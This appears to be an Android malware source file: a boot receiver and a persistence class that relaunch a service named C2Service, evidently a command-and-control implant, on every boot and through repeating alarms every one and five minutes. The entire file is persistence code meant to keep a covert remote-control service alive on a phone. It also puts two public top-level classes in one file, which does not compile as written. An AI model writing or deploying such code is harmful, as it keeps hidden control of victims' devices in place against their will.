package com.wuzenx.utils;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.SystemClock;
import com.wuzenx.C2Service;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (Intent.ACTION_BOOT_COMPLETED.equals(action) ||
            "android.intent.action.QUICKBOOT_POWERON".equals(action) ||
            "KEEP_ALIVE".equals(action)) {
            
            Intent svc = new Intent(context, C2Service.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                context.startForegroundService(svc);
            else
                context.startService(svc);
        }
    }
}

public class Persistence {
    public static void scheduleBoot(Context context) {
        PendingIntent pi = PendingIntent.getBroadcast(context, 0,
            new Intent(context, BootReceiver.class)
                .setAction(Intent.ACTION_BOOT_COMPLETED),
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        
        AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        am.setInexactRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + 10000, 60000, pi);
    }

    public static void keepAlive(Context context) {
        scheduleBoot(context);
        
        PendingIntent pi = PendingIntent.getBroadcast(context, 1,
            new Intent(context, BootReceiver.class)
                .setAction("KEEP_ALIVE"),
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        
        AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        am.setRepeating(AlarmManager.RTC_WAKEUP,
            System.currentTimeMillis() + 300000, 300000, pi);
    }
}
